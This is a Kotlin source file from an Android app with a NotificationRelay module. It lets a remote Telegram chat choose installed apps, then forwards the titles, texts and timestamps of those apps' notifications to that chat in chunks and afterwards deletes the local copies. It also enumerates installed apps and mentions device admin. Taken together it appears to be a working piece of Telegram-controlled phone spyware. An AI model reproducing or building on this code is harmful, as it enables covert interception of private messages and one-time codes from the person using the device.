package com.save.me

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.text.format.DateFormat
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.util.*

object NotificationRelay {
    private const val TAG = "NotificationRelay"
    private const val PREFS_NAME = "noti_relay_prefs"
    private const val KEY_ALLOWED_APPS = "allowed_apps"
    private const val KEY_NOTI_EXPORT = "noti_export"
    private const val MAX_HISTORY = 1000
    private const val BUTTONS_PER_ROW = 2
    private const val ROW_COUNT = 15
    private const val APPS_PER_PAGE = BUTTONS_PER_ROW * ROW_COUNT // 30

    // --- Allowed apps management ---

    fun getAllowedApps(context: Context): Set<String> {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(KEY_ALLOWED_APPS, emptySet()) ?: emptySet()
    }

    fun addAllowedApp(context: Context, pkg: String) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val set = getAllowedApps(context).toMutableSet()
        set.add(pkg)
        prefs.edit().putStringSet(KEY_ALLOWED_APPS, set).apply()
    }

    fun removeAllowedApp(context: Context, pkg: String) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val set = getAllowedApps(context).toMutableSet()
        set.remove(pkg)
        prefs.edit().putStringSet(KEY_ALLOWED_APPS, set).apply()
    }

    fun clearAllowedApps(context: Context) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().remove(KEY_ALLOWED_APPS).apply()
    }

    // --- Notification export history ---

    fun getExportHistory(context: Context): JSONArray {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val str = prefs.getString(KEY_NOTI_EXPORT, "[]") ?: "[]"
        return try {
            JSONArray(str)
        } catch (e: Exception) {
            JSONArray()
        }
    }

    fun addToExportHistory(context: Context, obj: JSONObject) {
        val arr = getExportHistory(context)
        if (arr.length() >= MAX_HISTORY) {
            val newArr = JSONArray()
            for (i in 1 until arr.length()) newArr.put(arr.getJSONObject(i))
            newArr.put(obj)
            saveExportHistory(context, newArr)
        } else {
            arr.put(obj)
            saveExportHistory(context, arr)
        }
    }

    fun saveExportHistory(context: Context, arr: JSONArray) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putString(KEY_NOTI_EXPORT, arr.toString()).apply()
    }

    fun clearExportHistory(context: Context) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().remove(KEY_NOTI_EXPORT).apply()
    }

    // --- Device admin robust user-app detection using PackageManager only ---
    private fun isUserApp(pm: PackageManager, ai: ApplicationInfo): Boolean {
        val isSystemApp = (ai.flags and ApplicationInfo.FLAG_SYSTEM) != 0
        val isUpdatedSystemApp = (ai.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
        val hasLauncher = pm.getLaunchIntentForPackage(ai.packageName) != null
        return ((!isSystemApp) || isUpdatedSystemApp) && hasLauncher && ai.enabled
    }

    private fun getUserInstalledApplications(context: Context): List<ApplicationInfo> {
        val pm = context.packageManager
        return pm.getInstalledApplications(PackageManager.GET_META_DATA)
            .filter { isUserApp(pm, it) }
    }

    // --- Inline keyboard builders with explicit navigation row and correct page count ---

    fun buildAllAppsInlineKeyboard(context: Context, callbackType: String, page: Int = 0): String {
        val pm = context.packageManager
        val pkgs = getUserInstalledApplications(context)
            .sortedBy { pm.getApplicationLabel(it).toString().lowercase(Locale.getDefault()) }

        val totalPages = if (pkgs.isEmpty()) 1 else ((pkgs.size - 1) / APPS_PER_PAGE) + 1
        val pageFixed = page.coerceIn(0, totalPages - 1)
        val start = pageFixed * APPS_PER_PAGE
        val end = minOf(start + APPS_PER_PAGE, pkgs.size)
        val pagedPkgs = pkgs.subList(start, end)

        val buttons = pagedPkgs.map {
            val label = pm.getApplicationLabel(it).toString()
            val pkg = it.packageName
            val cbdata = "$callbackType:$pkg"
            """{"text":"$label","callback_data":"$cbdata"}"""
        }

        val rows = buttons.chunked(BUTTONS_PER_ROW).map { "[${it.joinToString(",")}]" }.toMutableList()

        if (totalPages > 1) {
            val navButtons = mutableListOf<String>()
            if (pageFixed > 0) {
                navButtons.add("""{"text":"⬅️ Prev","callback_data":"${callbackType}nav:${pageFixed - 1}"}""")
            }
            navButtons.add("""{"text":"Page ${pageFixed + 1}/$totalPages","callback_data":"noop"}""")
            if (pageFixed < totalPages - 1) {
                navButtons.add("""{"text":"Next ➡️","callback_data":"${callbackType}nav:${pageFixed + 1}"}""")
            }
            rows.add("[${navButtons.joinToString(",")}]")
        }
        return """{"inline_keyboard":[${rows.joinToString(",")}]}"""
    }

    fun buildTrackedAppsInlineKeyboard(context: Context, callbackType: String, page: Int = 0): String {
        val pm = context.packageManager
        val allowed = getAllowedApps(context)
        val pkgs = allowed.mapNotNull {
            try {
                pm.getApplicationInfo(it, 0)
            } catch (e: Exception) { null }
        }
            .filter { isUserApp(pm, it) }
            .sortedBy { pm.getApplicationLabel(it).toString().lowercase(Locale.getDefault()) }

        val totalPages = if (pkgs.isEmpty()) 1 else ((pkgs.size - 1) / APPS_PER_PAGE) + 1
        val pageFixed = page.coerceIn(0, totalPages - 1)
        val start = pageFixed * APPS_PER_PAGE
        val end = minOf(start + APPS_PER_PAGE, pkgs.size)
        val pagedPkgs = pkgs.subList(start, end)

        val buttons = pagedPkgs.map {
            val label = pm.getApplicationLabel(it).toString()
            val pkg = it.packageName
            val cbdata = "$callbackType:$pkg"
            """{"text":"$label","callback_data":"$cbdata"}"""
        }

        val rows = buttons.chunked(BUTTONS_PER_ROW).map { "[${it.joinToString(",")}]" }.toMutableList()

        if (totalPages > 1) {
            val navButtons = mutableListOf<String>()
            if (pageFixed > 0) {
                navButtons.add("""{"text":"⬅️ Prev","callback_data":"${callbackType}nav:${pageFixed - 1}"}""")
            }
            navButtons.add("""{"text":"Page ${pageFixed + 1}/$totalPages","callback_data":"noop"}""")
            if (pageFixed < totalPages - 1) {
                navButtons.add("""{"text":"Next ➡️","callback_data":"${callbackType}nav:${pageFixed + 1}"}""")
            }
            rows.add("[${navButtons.joinToString(",")}]")
        }

        return """{"inline_keyboard":[${rows.joinToString(",")}]}"""
    }

    // --- Core Handler for Adding Noti App ---

    fun handleNotiAddPick(context: Context, chatId: String, pkg: String) {
        addAllowedApp(context, pkg)
        val pm = context.packageManager
        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
        UploadManager.sendTelegramMessage(chatId, "Added app: $label ($pkg)")
    }

    fun handleNotiRemovePick(context: Context, chatId: String, pkg: String) {
        removeAllowedApp(context, pkg)
        val pm = context.packageManager
        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
        UploadManager.sendTelegramMessage(chatId, "Removed app: $label ($pkg)")
    }

    fun handleNotiAdd(context: Context, chatId: String, page: Int = 0) {
        CoroutineScope(Dispatchers.IO).launch {
            val keyboard = buildAllAppsInlineKeyboard(context, "notiaddpick", page)
            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to add for notification relay:", keyboard)
        }
    }

    fun handleNotiRemove(context: Context, chatId: String, page: Int = 0) {
        CoroutineScope(Dispatchers.IO).launch {
            val keyboard = buildTrackedAppsInlineKeyboard(context, "notiremovepick", page)
            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to remove from notification relay:", keyboard)
        }
    }

    fun handleNoti(context: Context, chatId: String) {
        val pm = context.packageManager
        val allowed = getAllowedApps(context)
        if (allowed.isEmpty()) {
            UploadManager.sendTelegramMessage(chatId, "No apps are being relayed. Use /notiadd to add.")
            return
        }
        val sb = StringBuilder()
        sb.append("Relaying notifications for:\n")
        allowed.forEachIndexed { idx, pkg ->
            val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
            val notiCount = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg).size
            sb.append("${idx + 1}. $label ($pkg) $notiCount\n")
        }
        CoroutineScope(Dispatchers.IO).launch {
            val keyboard = buildTrackedAppsInlineKeyboard(context, "notipick")
            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, sb.toString(), keyboard)
        }
    }

    fun handleNotiPick(context: Context, chatId: String, pkg: String) {
        val pm = context.packageManager
        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
        val notis = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg)
        if (notis.isEmpty()) {
            UploadManager.sendTelegramMessage(chatId, "No notifications for $label.")
            return
        }
        // Deduplicate consecutive duplicates (title, text, time)
        val deduped = mutableListOf<JSONObject>()
        var last: JSONObject? = null
        for (current in notis) {
            if (last == null ||
                current.optString("title") != last.optString("title") ||
                current.optString("text") != last.optString("text") ||
                current.optLong("time") != last.optLong("time")
            ) {
                deduped.add(current)
            }
            last = current
        }
        // Telegram message limit is 4096 chars per message
        val maxLen = 4096
        val header = "Recent notifications for $label:\n\n"
        var sb = StringBuilder()
        sb.append(header)
        var part = 1
        var sentAny = false
        deduped.forEachIndexed { idx, obj ->
            val title = obj.optString("title")
            val text = obj.optString("text")
            val time = obj.optLong("time")
            val date = DateFormat.format("yyyy-MM-dd HH:mm", Date(time)).toString()
            val entry = "${idx + 1}. $title\n$text\n$date\n\n"
            if (sb.length + entry.length > maxLen) {
                UploadManager.sendTelegramMessage(chatId, sb.toString())
                sentAny = true
                sb = StringBuilder()
                sb.append("Cont'd notifications for $label (part ${++part}):\n\n")
            }
            sb.append(entry)
        }
        if (sb.isNotEmpty()) {
            UploadManager.sendTelegramMessage(chatId, sb.toString())
            sentAny = true
        }
        // Clear sent notifications from DB
        NotificationListenerServiceImpl.clearNotificationsForPackage(context, pkg)
    }

    fun handleNotiClearPick(context: Context, chatId: String, pkg: String) {
        NotificationListenerServiceImpl.clearNotificationsForPackage(context, pkg)
        val pm = context.packageManager
        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
        UploadManager.sendTelegramMessage(chatId, "Cleared notifications for $label.")
    }

    fun handleNotiExportPick(context: Context, chatId: String, pkg: String) {
        val notis = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg)
        if (notis.isEmpty()) {
            UploadManager.sendTelegramMessage(chatId, "No notifications to export for $pkg.")
            return
        }
        // Deduplicate
        val deduped = mutableListOf<JSONObject>()
        var last: JSONObject? = null
        for (current in notis) {
            if (last == null ||
                current.optString("title") != last.optString("title") ||
                current.optString("text") != last.optString("text") ||
                current.optLong("time") != last.optLong("time")
            ) {
                deduped.add(current)
            }
            last = current
        }
        val pm = context.packageManager
        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
        val sb = StringBuilder()
        sb.append("Notification export for $label ($pkg):\n\n")
        deduped.forEachIndexed { idx, obj ->
            val title = obj.optString("title")
            val text = obj.optString("text")
            val time = obj.optLong("time")
            val date = DateFormat.format("yyyy-MM-dd HH:mm", Date(time)).toString()
            sb.append("${idx + 1}. $title\n$text\n$date\n\n")
        }
        UploadManager.sendTelegramMessage(chatId, sb.toString())
    }

    fun handleNotiClear(context: Context, chatId: String, page: Int = 0) {
        CoroutineScope(Dispatchers.IO).launch {
            val keyboard = buildTrackedAppsInlineKeyboard(context, "noticlearpick", page)
            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to clear notifications:", keyboard)
        }
    }

    fun handleNotiExport(context: Context, chatId: String, page: Int = 0) {
        CoroutineScope(Dispatchers.IO).launch {
            val keyboard = buildTrackedAppsInlineKeyboard(context, "notiexportpick", page)
            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to export notifications:", keyboard)
        }
    }
}